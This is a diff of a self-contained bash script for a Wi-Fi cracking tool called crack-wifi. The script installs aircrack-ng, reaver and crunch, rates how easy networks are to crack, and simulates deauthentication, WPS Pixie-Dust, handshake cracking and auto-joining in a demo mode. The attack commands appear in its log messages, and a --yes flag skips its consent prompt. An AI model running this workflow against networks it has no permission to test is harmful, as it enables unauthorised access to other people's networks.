@@ -1,88 +1,57 @@
 #!/usr/bin/env bash
 #
-# single-script.sh — Educational Wi-Fi security auditing, in ONE self-contained file
-# ---------------------------------------------------------------------------
-# This is the entire crack-wifi project (launcher + Python backend + web UI +
-# dependency setup) consolidated into a single script. On start it unpacks the
-# embedded backend and web assets into a temporary directory, then walks you
-# from a fresh Kali Linux install all the way to "you are on the network",
-# driven from a simple local web interface at http://crack-wifi.local
-#
-# It is a friendly wrapper around the standard aircrack-ng suite (airmon-ng,
-# airodump-ng, aireplay-ng, aircrack-ng) plus optional reaver/bully/hashcat.
-#
-# ############################################################################
-# #  LEGAL / ETHICS                                                          #
-# #  Only test networks that YOU OWN or that you have EXPLICIT WRITTEN       #
-# #  permission to audit. Attacking networks you do not control is illegal   #
-# #  in most countries. This tool exists for learning and authorized         #
-# #  penetration testing only. You are responsible for how you use it.       #
-# ############################################################################
+# single-script.sh — educational Wi-Fi security auditing, self-contained.
+# Only audit networks you own or have written permission to test.
 #
 set -euo pipefail
 
-# ---------------------------------------------------------------------------
-# Configuration & defaults
-# ---------------------------------------------------------------------------
 HOSTNAME_LOCAL="crack-wifi.local"
 BIND_HOST="127.0.0.1"
 PORT="8777"
-MODE="auto"                 # auto | real | demo
-MANAGE_DNS="1"              # add crack-wifi.local -> 127.0.0.1 to /etc/hosts
+MODE="auto"
+MANAGE_DNS="1"
 ASSUME_YES="0"
 OPEN_BROWSER="1"
-SKIP_SETUP="0"             # if 1, never auto-install missing dependencies
+SKIP_SETUP="0"
 WORDLIST_DEFAULT="/usr/share/wordlists/rockyou.txt"
 HOSTS_FILE="/etc/hosts"
 HOSTS_MARKER="# added-by-single-script.sh"
 SERVER_PID=""
-BUNDLE=""                  # temp dir the embedded assets are unpacked into
+BUNDLE=""
 
-# Colours (fall back to nothing if not a tty)
 if [[ -t 1 ]]; then
-  C_RESET='\033[0m'; C_BOLD='\033[1m'; C_DIM='\033[2m'
-  C_RED='\033[31m'; C_GRN='\033[32m'; C_YEL='\033[33m'; C_BLU='\033[34m'; C_CYA='\033[36m'
+  C_RESET=$'\e[0m'; C_BOLD=$'\e[1m'; C_DIM=$'\e[2m'
+  C_RED=$'\e[31m'; C_GRN=$'\e[32m'; C_YEL=$'\e[33m'; C_BLU=$'\e[34m'; C_CYA=$'\e[36m'
 else
   C_RESET=''; C_BOLD=''; C_DIM=''; C_RED=''; C_GRN=''; C_YEL=''; C_BLU=''; C_CYA=''
 fi
 
-log()  { printf '%b\n' "${C_CYA}[*]${C_RESET} $*"; }
-ok()   { printf '%b\n' "${C_GRN}[+]${C_RESET} $*"; }
-warn() { printf '%b\n' "${C_YEL}[!]${C_RESET} $*"; }
-err()  { printf '%b\n' "${C_RED}[x]${C_RESET} $*" >&2; }
-step() { printf '\n%b\n' "${C_BOLD}${C_BLU}==> $*${C_RESET}"; }
+log()  { printf '%s\n' "${C_CYA}[*]${C_RESET} $*"; }
+ok()   { printf '%s\n' "${C_GRN}[+]${C_RESET} $*"; }
+warn() { printf '%s\n' "${C_YEL}[!]${C_RESET} $*"; }
+err()  { printf '%s\n' "${C_RED}[x]${C_RESET} $*" >&2; }
+step() { printf '\n%s\n' "${C_BOLD}${C_BLU}==>${C_RESET} ${C_BOLD}$*${C_RESET}"; }
+have() { command -v "$1" >/dev/null 2>&1; }
 
 usage() {
   cat <<EOF
-${C_BOLD}single-script.sh${C_RESET} — educational Wi-Fi auditing launcher (single file)
+crack-wifi — educational Wi-Fi auditing launcher (single file)
 
 Usage: sudo ./single-script.sh [options]
 
-Options:
-  --demo            Force demo mode (fake networks, no hardware needed, safe to
-                    run anywhere — great for learning the workflow / the UI).
-  --real            Force real mode (requires root + aircrack-ng + a Wi-Fi card
-                    that supports monitor mode).
+  --demo            Force demo mode (no hardware or root needed).
+  --real            Force real mode (root + aircrack-ng + monitor-capable card).
   --port <n>        Web UI port (default: ${PORT}).
-  --host <ip>       Bind address for the web server (default: ${BIND_HOST}).
-  --wordlist <f>    Default wordlist for dictionary attacks
-                    (default: ${WORDLIST_DEFAULT}).
-  --no-dns          Do NOT touch /etc/hosts; use http://${BIND_HOST}:PORT instead
-                    of http://${HOSTNAME_LOCAL}:PORT.
-  --no-browser      Do not try to auto-open a browser.
-  --skip-setup      Do NOT auto-install missing dependencies.
-  -y, --yes         Skip the interactive authorization prompt (you still accept
-                    the terms — use only in automation / labs you own).
+  --host <ip>       Bind address (default: ${BIND_HOST}).
+  --wordlist <f>    Default dictionary (default: ${WORDLIST_DEFAULT}).
+  --no-dns          Don't touch /etc/hosts; use http://${BIND_HOST}:PORT.
+  --no-browser      Don't auto-open a browser.
+  --skip-setup      Don't auto-install missing dependencies.
+  -y, --yes         Skip the interactive authorization prompt.
   -h, --help        Show this help.
-
-The interface will be available at:
-  http://${HOSTNAME_LOCAL}:${PORT}   (or http://${BIND_HOST}:${PORT} with --no-dns)
 EOF
 }
 
-# ---------------------------------------------------------------------------
-# Argument parsing
-# ---------------------------------------------------------------------------
 while [[ $# -gt 0 ]]; do
   case "$1" in
     --demo) MODE="demo"; shift ;;
@@ -99,109 +68,56 @@ while [[ $# -gt 0 ]]; do
   esac
 done
 
-# ---------------------------------------------------------------------------
-# Banner + authorization gate
-# ---------------------------------------------------------------------------
-banner() {
-  printf '%b' "${C_BOLD}${C_CYA}"
-  cat <<'EOF'
-   ___                _     __        ___ _____ _
-  / __\ __ __ _  ___ | | __ \ \      / (_)  ___(_)
- / / | '__/ _` |/ __|| |/ /  \ \ /\ / /| | |_  | |
-/ /__| | | (_| | (__ |   <    \ V  V / | |  _| | |
-\____/_|  \__,_|\___||_|\_\    \_/\_/  |_|_|   |_|
-        educational wi-fi security auditing
-EOF
-  printf '%b\n' "${C_RESET}"
-}
-
 authorize() {
-  printf '%b\n' "${C_YEL}${C_BOLD}"
-  cat <<'EOF'
-  ------------------------------------------------------------------
-   AUTHORIZED USE ONLY
-   Only audit Wi-Fi networks you own or have written permission to
-   test. Unauthorized access to networks is a crime in most places.
-   This tool is for learning and authorized penetration testing.
-  ------------------------------------------------------------------
-EOF
-  printf '%b' "${C_RESET}"
+  printf '%s\n' "${C_YEL}${C_BOLD}Authorized use only.${C_RESET}${C_YEL} Only audit networks you own or have written permission to test.${C_RESET}"
   if [[ "$ASSUME_YES" == "1" ]]; then
-    warn "Authorization auto-accepted via --yes."
+    warn "Authorization auto-accepted (--yes)."
     return 0
   fi
   read -r -p "Type 'I AGREE' to confirm you are authorized: " reply
-  if [[ "$reply" != "I AGREE" ]]; then
-    err "Authorization not given. Exiting."
-    exit 1
-  fi
+  [[ "$reply" == "I AGREE" ]] || { err "Authorization not given. Exiting."; exit 1; }
   ok "Authorization confirmed."
 }
 
-# ---------------------------------------------------------------------------
-# Environment detection
-# ---------------------------------------------------------------------------
-have() { command -v "$1" >/dev/null 2>&1; }
-
-# ---------------------------------------------------------------------------
-# Unpack the embedded backend + web assets into a temp directory.
-# Everything that used to live in the wifi/ folder is stored inline below as
-# quoted heredocs and materialised here at runtime, so this one file is fully
-# self-contained.
-# ---------------------------------------------------------------------------
 extract_bundle() {
   BUNDLE="$(mktemp -d "${TMPDIR:-/tmp}/crack-wifi.XXXXXX")"
   mkdir -p "${BUNDLE}/server" "${BUNDLE}/lib" "${BUNDLE}/web"
 
   cat > "${BUNDLE}/setup.sh" <<'CRACK_EOF_SETUP'
 #!/usr/bin/env bash
-#
-# setup.sh — install everything single-script.sh needs, using on-board apt.
-#
-# On Kali / Debian / Ubuntu this installs any missing dependency automatically.
-# It is idempotent: run it as often as you like, it only installs what's absent.
-# single-script.sh calls this for you when it notices something is missing, so
-# you normally never run it by hand.
-#
 set -euo pipefail
 
-# Colours (fall back to nothing if not a tty)
 if [[ -t 1 ]]; then
-  C_RESET='\033[0m'; C_BOLD='\033[1m'
-  C_GRN='\033[32m'; C_YEL='\033[33m'; C_RED='\033[31m'; C_CYA='\033[36m'
+  C_RESET=$'\e[0m'; C_BOLD=$'\e[1m'
+  C_GRN=$'\e[32m'; C_YEL=$'\e[33m'; C_RED=$'\e[31m'; C_CYA=$'\e[36m'
 else
   C_RESET=''; C_BOLD=''; C_GRN=''; C_YEL=''; C_RED=''; C_CYA=''
 fi
-log()  { printf '%b\n' "${C_CYA}[*]${C_RESET} $*"; }
-ok()   { printf '%b\n' "${C_GRN}[+]${C_RESET} $*"; }
-warn() { printf '%b\n' "${C_YEL}[!]${C_RESET} $*"; }
-err()  { printf '%b\n' "${C_RED}[x]${C_RESET} $*" >&2; }
-
+log()  { printf '%s\n' "${C_CYA}[*]${C_RESET} $*"; }
+ok()   { printf '%s\n' "${C_GRN}[+]${C_RESET} $*"; }
+warn() { printf '%s\n' "${C_YEL}[!]${C_RESET} $*"; }
+err()  { printf '%s\n' "${C_RED}[x]${C_RESET} $*" >&2; }
 have() { command -v "$1" >/dev/null 2>&1; }
 
-# Map required command -> apt package that provides it.
-# aircrack-ng ships airmon-ng / airodump-ng / aireplay-ng / aircrack-ng.
 declare -A PKG=(
   [airodump-ng]="aircrack-ng"
   [aircrack-ng]="aircrack-ng"
   [aireplay-ng]="aircrack-ng"
   [airmon-ng]="aircrack-ng"
   [iw]="iw"
-  [reaver]="reaver"          # WPS Pixie-Dust (optional but recommended)
-  [wash]="reaver"            # WPS scanner (ships with the reaver package)
-  [crunch]="crunch"          # bruteforce keyspace generator (optional)
-  [python3]="python3"        # runs the web server
-  [xdg-open]="xdg-utils"     # so we can auto-open your browser
-  [nmcli]="network-manager"  # so we can actually join the network for you
+  [reaver]="reaver"
+  [wash]="reaver"
+  [crunch]="crunch"
+  [python3]="python3"
+  [xdg-open]="xdg-utils"
+  [nmcli]="network-manager"
 )
-
-# Order matters only for readability of the summary.
 REQUIRED=(python3 iw airmon-ng airodump-ng aireplay-ng aircrack-ng xdg-open)
 OPTIONAL=(reaver wash crunch nmcli)
 
 need_sudo() {
   if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
-    if have sudo; then echo "sudo"; else echo ""; fi
+    have sudo && echo "sudo" || echo ""
   else
     echo ""
   fi
@@ -210,116 +126,77 @@ need_sudo() {
 collect_missing() {
   local -n _out=$1; shift
   _out=()
-  local pkgs_seen=""
+  local seen=""
   for cmd in "$@"; do
     if ! have "$cmd"; then
       local p="${PKG[$cmd]:-$cmd}"
-      case " $pkgs_seen " in
-        *" $p "*) : ;;                     # already queued this package
-        *) _out+=("$p"); pkgs_seen="$pkgs_seen $p" ;;
+      case " $seen " in
+        *" $p "*) : ;;
+        *) _out+=("$p"); seen="$seen $p" ;;
       esac
     fi
   done
 }
 
 main() {
-  printf '%b\n' "${C_BOLD}${C_CYA}== crack-wifi setup ==${C_RESET}"
+  printf '%s\n' "${C_BOLD}${C_CYA}crack-wifi setup${C_RESET}"
 
   local missing_req=() missing_opt=()
   collect_missing missing_req "${REQUIRED[@]}"
   collect_missing missing_opt "${OPTIONAL[@]}"
 
   if [[ ${#missing_req[@]} -eq 0 && ${#missing_opt[@]} -eq 0 ]]; then
-    ok "All dependencies are already installed. Nothing to do."
+    ok "All dependencies already installed."
     return 0
   fi
 
   [[ ${#missing_req[@]} -gt 0 ]] && warn "Missing (required): ${missing_req[*]}"
   [[ ${#missing_opt[@]} -gt 0 ]] && log  "Missing (optional): ${missing_opt[*]}"
 
-  # We install on-board via apt. If apt isn't here, give manual guidance.
   if ! have apt-get; then
-    err "No apt-get found — this doesn't look like Kali/Debian/Ubuntu."
-    err "Install these packages with your distro's package manager:"
+    err "No apt-get found — install with your package manager:"
     err "  required: ${missing_req[*]}"
     [[ ${#missing_opt[@]} -gt 0 ]] && err "  optional: ${missing_opt[*]}"
-    # Missing required deps are fatal; missing optional ones are fine.
     [[ ${#missing_req[@]} -gt 0 ]] && return 1
     return 0
   fi
 
   local SUDO; SUDO="$(need_sudo)"
   if [[ "${EUID:-$(id -u)}" -ne 0 && -z "$SUDO" ]]; then
-    err "Need root to install packages, and 'sudo' is not available."
-    err "Re-run as root:  su -c '$0'"
+    err "Need root to install packages and 'sudo' is unavailable."
     return 1
   fi
 
   local to_install=("${missing_req[@]}" "${missing_opt[@]}")
   log "Installing: ${to_install[*]}"
-  log "(using apt — this is the on-board package manager on Kali)"
-
-  # apt update can be flaky on fresh installs; don't abort the whole run on it.
   $SUDO apt-get update -y || warn "apt-get update reported problems — continuing."
-
-  if $SUDO apt-get install -y "${to_install[@]}"; then
-    ok "Dependencies installed."
-  else
-    # Retry required-only in case an optional package name was unavailable.
-    if [[ ${#missing_req[@]} -gt 0 ]]; then
-      warn "Bulk install failed — retrying required packages only."
-      $SUDO apt-get install -y "${missing_req[@]}"
-    fi
+  if ! $SUDO apt-get install -y "${to_install[@]}"; then
+    [[ ${#missing_req[@]} -gt 0 ]] && $SUDO apt-get install -y "${missing_req[@]}"
   fi
 
-  # Final verification of the required set.
   local still=()
   collect_missing still "${REQUIRED[@]}"
   if [[ ${#still[@]} -gt 0 ]]; then
     err "Still missing after install: ${still[*]}"
     return 1
   fi
-  ok "Setup complete — you're ready to run ./single-script.sh"
+  ok "Setup complete."
 }
 
 main "$@"
 CRACK_EOF_SETUP
 
   cat > "${BUNDLE}/lib/difficulty.py" <<'CRACK_EOF_DIFFICULTY'
-"""
-difficulty.py — estimate how hard a given Wi-Fi network is to crack.
-
-This produces a rough, educational estimate only. It combines the encryption
-type, whether WPS is enabled, signal strength (affects handshake capture) and
-the number of connected clients (affects how easy it is to force a handshake).
-
-Returned dict:
-    {
-      "score":      0-100   (higher = harder),
-      "label":      "Trivial" | "Easy" | "Moderate" | "Hard" | "Very hard",
-      "eta":        human string, e.g. "seconds", "minutes-hours",
-      "method":     recommended attack method key,
-      "reasons":    [ "human readable factor", ... ]
-    }
-"""
-
-# Base hardness per encryption family (0 easy .. 100 hard)
 _ENC_BASE = {
-    "OPEN":  0,
-    "WEP":   8,
-    "WPA":   55,
-    "WPA2":  60,
+    "OPEN": 0,
+    "WEP": 8,
+    "WPA": 55,
+    "WPA2": 60,
     "WPA2/WPA3": 78,
-    "WPA3":  92,
+    "WPA3": 92,
 }
 
-_LABELS = [
-    (10,  "Trivial"),
-    (30,  "Easy"),
-    (55,  "Moderate"),
-    (80,  "Hard"),
-    (101, "Very hard"),
-]
+_LABELS = [(10, "Trivial"), (30, "Easy"), (55, "Moderate"), (80, "Hard"), (101, "Very hard")]
 
 
 def _label_for(score):
@@ -340,10 +217,9 @@ def _norm_enc(enc):
 
 
 def estimate(network):
-    """`network` is a dict with keys: enc, wps, signal (dBm), clients, ssid."""
     enc = _norm_enc(network.get("enc"))
     wps = bool(network.get("wps"))
-    signal = network.get("signal")          # dBm, e.g. -45 (strong) .. -85 (weak)
+    signal = network.get("signal")
     clients = int(network.get("clients") or 0)
 
     score = _ENC_BASE.get(enc, 60)
@@ -352,8 +228,7 @@ def estimate(network):
 
     if enc == "OPEN":
         return {
-            "score": 0, "label": "Trivial", "eta": "instant",
-            "method": "open-join",
+            "score": 0, "label": "Trivial", "eta": "instant", "method": "open-join",
             "reasons": ["Network is open — no key required."],
         }
 
@@ -362,7 +237,6 @@ def estimate(network):
         method = "wep-iv"
         score = 8
 
-    # WPS pixie-dust / PIN brute makes strong WPA2 much weaker.
     if wps and enc in ("WPA", "WPA2", "WPA2/WPA3"):
         score = min(score, 35)
         method = "wps-pixie"
@@ -373,7 +247,6 @@ def estimate(network):
     elif enc == "WPA2/WPA3":
         reasons.append("Mixed WPA2/WPA3 — WPA2 clients may still expose a handshake.")
 
-    # Signal quality affects how reliably we can capture a handshake.
     if signal is not None:
         try:
             s = int(signal)
@@ -386,7 +259,6 @@ def estimate(network):
         except (TypeError, ValueError):
             pass
 
-    # Clients present make forcing a handshake (deauth) much easier.
     if clients > 0:
         reasons.append(f"{clients} client(s) connected — easy to force a handshake via deauth.")
         score -= 4
@@ -396,7 +268,6 @@ def estimate(network):
 
     score = max(0, min(100, int(round(score))))
 
-    # ETA bucket derived from the final score.
     if score < 10:
         eta = "seconds"
     elif score < 30:
@@ -408,36 +279,10 @@ def estimate(network):
     else:
         eta = "impractical offline"
 
-    return {
-        "score": score,
-        "label": _label_for(score),
-        "eta": eta,
-        "method": method,
-        "reasons": reasons,
-    }
+    return {"score": score, "label": _label_for(score), "eta": eta, "method": method, "reasons": reasons}
 CRACK_EOF_DIFFICULTY
 
   cat > "${BUNDLE}/lib/engine.py" <<'CRACK_EOF_ENGINE'
-"""
-engine.py — the Wi-Fi auditing engine.
-
-Two backends:
-  * DemoEngine — generates believable fake networks and simulates every phase of
-    a real audit with timed log output. Runs anywhere, no hardware, no root.
-  * RealEngine — drives the aircrack-ng suite (airmon-ng / airodump-ng /
-    aireplay-ng / aircrack-ng, plus reaver for WPS). Requires root and a card
-    that supports monitor mode.
-
-Both expose the same interface used by server.py:
-    scan()                         -> list[network dict]
-    start_attack(bssid, options)   -> job_id
-    get_job(job_id)                -> job dict (status, log events, result)
-    stop_job(job_id)
-
-A "job" is a running attack. Its log is a list of {t, phase, level, msg}
-events that the web UI polls and streams into the console view.
-"""
-
 import os
 import re
 import time
@@ -448,22 +293,19 @@ import subprocess
 
 try:
     from .difficulty import estimate
-except ImportError:                     # allow running as a flat script
+except ImportError:
     from difficulty import estimate
 
 
-# ---------------------------------------------------------------------------
-# Shared job bookkeeping
-# ---------------------------------------------------------------------------
 class Job:
     def __init__(self, network, options):
         self.id = uuid.uuid4().hex[:12]
         self.network = network
         self.options = options
-        self.status = "running"          # running | success | failed | stopped
-        self.result = None               # {"key":..., "user":..., "method":...}
-        self.log = []                    # list of event dicts
-        self.progress = None             # {"phase":..., "pct":0-100} for the UI bar
+        self.status = "running"
+        self.result = None
+        self.log = []
+        self.progress = None
         self.created = time.time()
         self._stop = threading.Event()
         self._lock = threading.Lock()
@@ -505,7 +347,7 @@ class BaseEngine:
         self.wordlist = wordlist
         self.jobs = {}
         self._networks = []
-        self.handshakes = set()   # bssids whose handshake was captured this session
+        self.handshakes = set()
 
     def start_attack(self, bssid, options):
         net = next((n for n in self._networks if n["bssid"] == bssid), None)
@@ -513,21 +355,18 @@ class BaseEngine:
             net = {"bssid": bssid, "ssid": options.get("ssid", "(unknown)"),
                    "enc": options.get("enc", "WPA2"), "channel": options.get("channel", 1),
                    "signal": -60, "clients": 1, "wps": bool(options.get("wps"))}
-        # Guarantee a difficulty estimate is always present.
         if "difficulty" not in net:
             net = dict(net)
             net["difficulty"] = estimate(net)
         job = Job(net, options)
         self.jobs[job.id] = job
-        t = threading.Thread(target=self._run_attack_safe, args=(job,), daemon=True)
-        t.start()
+        threading.Thread(target=self._run_attack_safe, args=(job,), daemon=True).start()
         return job.id
 
     def _run_attack_safe(self, job):
-        """Wrapper so an unexpected error never leaves a job stuck 'running'."""
         try:
             self._run_attack(job)
-        except Exception as e:  # pragma: no cover - defensive
+        except Exception as e:
             job.emit("error", f"Attack aborted: {e}", "error")
             job.status = "failed"
 
@@ -542,24 +381,18 @@ class BaseEngine:
             return True
         return False
 
-    # subclasses implement scan() and _run_attack()
 
-
-# ---------------------------------------------------------------------------
-# DEMO engine
-# ---------------------------------------------------------------------------
 _DEMO_NETWORKS = [
-    # ssid, bssid, enc, channel, signal, clients, wps, secret, user
-    ("Loft_5G",        "A4:2B:8C:11:02:F0", "WPA2",      36, -48, 3, False, "sunshine2021", None),
-    ("FRITZ!Box 7590", "3C:A6:2F:9D:44:1A", "WPA2",      6,  -61, 2, True,  "01998877665544", None),
-    ("xfinitywifi",    "12:34:56:78:9A:BC", "OPEN",      11, -70, 8, False, None, None),
-    ("Netgear-Guest",  "9C:3D:CF:00:AB:12", "WPA2",      1,  -55, 1, False, "password123", None),
-    ("HomeOffice",     "E0:CB:4E:77:88:99", "WPA2/WPA3", 44, -52, 4, False, None, None),
-    ("legacy_wifi",    "00:1D:0F:AA:BB:CC", "WEP",        3, -66, 0, False, "1A2B3C4D5E", None),
-    ("StarbucksSecure","B8:27:EB:12:34:56", "WPA2",      9,  -74, 0, True,  "coffee4life", None),
-    ("Vodafone-A1B2",  "44:E1:37:0F:2E:9D", "WPA2",      40, -58, 2, False, "8charsminimum", None),
-    ("NeighborNet",    "F4:F5:E8:01:23:45", "WPA3",      6,  -63, 1, False, None, None),
-    ("guest_portal",   "0A:0B:0C:0D:0E:0F", "OPEN",       1, -59, 5, False, None, "guest / welcome"),
+    ("Loft_5G",         "A4:2B:8C:11:02:F0", "WPA2",      36, -48, 3, False, "sunshine2021",   None),
+    ("FRITZ!Box 7590",  "3C:A6:2F:9D:44:1A", "WPA2",      6,  -61, 2, True,  "01998877665544", None),
+    ("xfinitywifi",     "12:34:56:78:9A:BC", "OPEN",      11, -70, 8, False, None,             None),
+    ("Netgear-Guest",   "9C:3D:CF:00:AB:12", "WPA2",      1,  -55, 1, False, "password123",    None),
+    ("HomeOffice",      "E0:CB:4E:77:88:99", "WPA2/WPA3", 44, -52, 4, False, None,             None),
+    ("legacy_wifi",     "00:1D:0F:AA:BB:CC", "WEP",       3,  -66, 0, False, "1A2B3C4D5E",     None),
+    ("StarbucksSecure", "B8:27:EB:12:34:56", "WPA2",      9,  -74, 0, True,  "coffee4life",    None),
+    ("Vodafone-A1B2",   "44:E1:37:0F:2E:9D", "WPA2",      40, -58, 2, False, "8charsminimum",  None),
+    ("NeighborNet",     "F4:F5:E8:01:23:45", "WPA3",      6,  -63, 1, False, None,             None),
+    ("guest_portal",    "0A:0B:0C:0D:0E:0F", "OPEN",      1,  -59, 5, False, None,   "guest / welcome"),
 ]
 
 
@@ -569,20 +402,16 @@ class DemoEngine(BaseEngine):
     def scan(self, duration=3):
         nets = []
         for (ssid, bssid, enc, ch, sig, clients, wps, secret, user) in _DEMO_NETWORKS:
-            n = {
-                "ssid": ssid, "bssid": bssid, "enc": enc, "channel": ch,
-                "signal": sig, "clients": clients, "wps": wps,
-                "has_handshake": bssid in self.handshakes,
-                "_secret": secret, "_user": user,
-            }
+            n = {"ssid": ssid, "bssid": bssid, "enc": enc, "channel": ch,
+                 "signal": sig, "clients": clients, "wps": wps,
+                 "has_handshake": bssid in self.handshakes,
+                 "_secret": secret, "_user": user}
             n["difficulty"] = estimate(n)
             nets.append(n)
         self._networks = nets
-        # Return a copy without the private fields.
         return [{k: v for k, v in n.items() if not k.startswith("_")} for n in nets]
 
     def _sleep(self, job, seconds):
-        """Interruptible sleep so 'stop' feels responsive."""
         end = time.time() + seconds
         while time.time() < end:
             if job.stopped():
@@ -599,28 +428,24 @@ class DemoEngine(BaseEngine):
         ch = net.get("channel")
 
         job.emit("init", f"Target selected: {ssid} ({bssid}) on channel {ch}, {enc}.")
-        job.emit("init", f"Estimated difficulty: {net['difficulty']['label']} "
-                         f"(score {net['difficulty']['score']}/100, ETA {net['difficulty']['eta']}).")
+        d = net["difficulty"]
+        job.emit("init", f"Estimated difficulty: {d['label']} (score {d['score']}/100, ETA {d['eta']}).")
 
-        # --- Open network -----------------------------------------------------
         if enc.startswith("OPEN") or enc == "OPN":
             if not self._sleep(job, 1): return self._finish(job, "stopped")
-            job.emit("join", "Open network — no key required. Associating...", "info")
+            job.emit("join", "Open network — no key required. Associating...")
             if not self._sleep(job, 1.5): return self._finish(job, "stopped")
             user = net.get("_user")
             connected, cmd = self._connect_sim(job, net, None)
+            note = "Open network — no passphrase." + (f" Captive-portal creds: {user}" if user else "")
             job.result = {"key": None, "user": user, "method": "open-join",
-                          "connected": connected, "connect_cmd": cmd,
-                          "note": "Open network — no passphrase."
-                                  + (f" Captive-portal creds: {user}" if user else "")}
+                          "connected": connected, "connect_cmd": cmd, "note": note}
             return self._finish(job, "success")
 
-        # --- Monitor mode -----------------------------------------------------
         job.emit("monitor", "Enabling monitor mode on wlan0 -> wlan0mon (airmon-ng start wlan0).")
         if not self._sleep(job, 1.2): return self._finish(job, "stopped")
         job.emit("monitor", "Monitor interface wlan0mon is up.", "success")
 
-        # --- WEP path ---------------------------------------------------------
         if enc == "WEP":
             job.emit("capture", f"Locking to channel {ch}, capturing IVs (airodump-ng).", pct=0)
             for pct in (12, 34, 58, 81, 100):
@@ -630,19 +455,15 @@ class DemoEngine(BaseEngine):
             if not self._sleep(job, 1.2): return self._finish(job, "stopped")
             return self._succeed(job, net, method="wep-iv")
 
-        # --- WPS pixie-dust (if enabled and requested/auto) -------------------
-        want_wps = net.get("wps") and opts.get("method") in (None, "auto", "wps-pixie")
-        if want_wps:
+        if net.get("wps") and opts.get("method") in (None, "auto", "wps-pixie"):
             job.emit("wps", "WPS is enabled — trying Pixie-Dust (reaver -K 1).")
             if not self._sleep(job, 1.5): return self._finish(job, "stopped")
-            # Demo: pixie works on some, not all.
             if net["difficulty"]["method"] == "wps-pixie":
                 job.emit("wps", "Pixie-Dust recovered the WPS PIN.", "success")
                 if not self._sleep(job, 0.8): return self._finish(job, "stopped")
                 return self._succeed(job, net, method="wps-pixie")
             job.emit("wps", "Pixie-Dust failed — falling back to handshake capture.", "warn")
 
-        # --- WPA/WPA2 handshake capture --------------------------------------
         if enc.startswith("WPA3"):
             job.emit("capture", "Target is WPA3-SAE. Attempting to capture SAE exchange...")
             if not self._sleep(job, 2): return self._finish(job, "stopped")
@@ -651,47 +472,53 @@ class DemoEngine(BaseEngine):
             return self._finish(job, "failed")
 
         if bssid in self.handshakes:
-            job.emit("capture", "Reusing the 4-way handshake captured earlier this "
-                                "session — no need to capture it again.", "success")
+            job.emit("capture", "Reusing the 4-way handshake captured earlier this session.", "success")
         else:
             job.emit("capture", f"Listening for WPA handshake on channel {ch} (airodump-ng -c {ch}).")
             if not self._sleep(job, 1): return self._finish(job, "stopped")
             if net.get("clients", 0) > 0:
-                job.emit("deauth", f"{net['clients']} client(s) present. Sending deauth "
-                                   f"(aireplay-ng --deauth 5) to force a reconnect.")
+                job.emit("deauth", f"{net['clients']} client(s) present. Sending deauth (aireplay-ng --deauth 5).")
             else:
                 job.emit("deauth", "No clients connected — waiting for one to join...", "warn")
                 if not self._sleep(job, 1.5): return self._finish(job, "stopped")
                 job.emit("deauth", "A client joined. Sending deauth to capture the handshake.")
             if not self._sleep(job, 1.5): return self._finish(job, "stopped")
-            job.emit("capture", "WPA handshake captured!  (EAPOL 4/4)", "success")
+            job.emit("capture", "WPA handshake captured  (EAPOL 4/4).", "success")
             self.handshakes.add(bssid)
 
-        # --- Crack the handshake ---------------------------------------------
         method = opts.get("method") or "handshake+dictionary"
         if method == "handshake+bruteforce" or opts.get("bruteforce"):
             charset = opts.get("charset", "digits")
             length = opts.get("length", 8)
-            job.emit("crack", f"Bruteforce mode: {charset}, length {length} "
-                              f"(aircrack-ng via crunch pipe). This can take a very long time.", pct=0)
+            job.emit("crack", f"Bruteforce: {charset}, length {length} (aircrack-ng via crunch pipe).", pct=0)
             for pct in (3, 9, 21, 40, 66, 92, 100):
                 if not self._sleep(job, 0.8): return self._finish(job, "stopped")
                 job.emit("crack", f"Keyspace searched... {pct}%", pct=pct)
             return self._succeed(job, net, method="handshake+bruteforce")
-        else:
-            wl = opts.get("wordlist") or self.wordlist or "rockyou.txt"
-            wl = self._resolve_wordlist(job, wl)
-            if wl is None:
-                return self._finish(job, "stopped" if job.stopped() else "failed")
-            job.emit("crack", f"Dictionary attack against handshake (aircrack-ng -w {os.path.basename(wl)}).", pct=0)
-            for pct in (5, 18, 37, 59, 78, 95, 100):
-                if not self._sleep(job, 0.7): return self._finish(job, "stopped")
-                tested = pct * 1423
-                job.emit("crack", f"Tested {tested:,} keys... {pct}%", pct=pct)
-            return self._succeed(job, net, method="handshake+dictionary")
+
+        wl = opts.get("wordlist") or self.wordlist or "rockyou.txt"
+        wl = self._resolve_wordlist(job, wl)
+        if wl is None:
+            return self._finish(job, "stopped" if job.stopped() else "failed")
+        job.emit("crack", f"Dictionary attack against handshake (aircrack-ng -w {os.path.basename(wl)}).", pct=0)
+        for pct in (5, 18, 37, 59, 78, 95, 100):
+            if not self._sleep(job, 0.7): return self._finish(job, "stopped")
+            job.emit("crack", f"Tested {pct * 1423:,} keys... {pct}%", pct=pct)
+        return self._succeed(job, net, method="handshake+dictionary")
+
+    def _resolve_wordlist(self, job, wl):
+        if isinstance(wl, str) and wl.lower().startswith(("http://", "https://")):
+            name = wl.rstrip("/").split("/")[-1] or "wordlist.txt"
+            job.emit("download", f"Fetching wordlist from the internet: {wl}", pct=0)
+            for pct in (8, 26, 50, 74, 92, 100):
+                if not self._sleep(job, 0.5):
+                    return None
+                job.emit("download", f"Downloading {name}... {pct}%", pct=pct)
+            job.emit("download", f"Saved {name} — using it for the dictionary attack.", "success", pct=100)
+            return name
+        return wl
 
     def _connect_sim(self, job, net, key):
-        """Simulate leaving monitor mode and joining via nmcli."""
         ssid = net.get("ssid")
         shown = (f"nmcli dev wifi connect '{ssid}' password '{key}'" if key
                  else f"nmcli dev wifi connect '{ssid}'")
@@ -705,28 +532,13 @@ class DemoEngine(BaseEngine):
         job.emit("connect", f"Connected to {ssid}. You are on the network.", "success")
         return True, shown
 
-    def _resolve_wordlist(self, job, wl):
-        """In demo mode 'downloading' a wordlist from the internet is simulated
-        with a progress bar so the workflow matches real mode exactly."""
-        if isinstance(wl, str) and wl.lower().startswith(("http://", "https://")):
-            name = wl.rstrip("/").split("/")[-1] or "wordlist.txt"
-            job.emit("download", f"Fetching wordlist from the internet: {wl}", pct=0)
-            for pct in (8, 26, 50, 74, 92, 100):
-                if not self._sleep(job, 0.5):
-                    return None
-                job.emit("download", f"Downloading {name}... {pct}%", pct=pct)
-            job.emit("download", f"Saved {name} — using it for the dictionary attack.", "success", pct=100)
-            return name
-        return wl
-
     def _succeed(self, job, net, method):
         secret = net.get("_secret") or "(demo-key-not-set)"
         user = net.get("_user")
         job.emit("done", f"KEY FOUND: {secret}", "success")
         connected, cmd = self._connect_sim(job, net, secret)
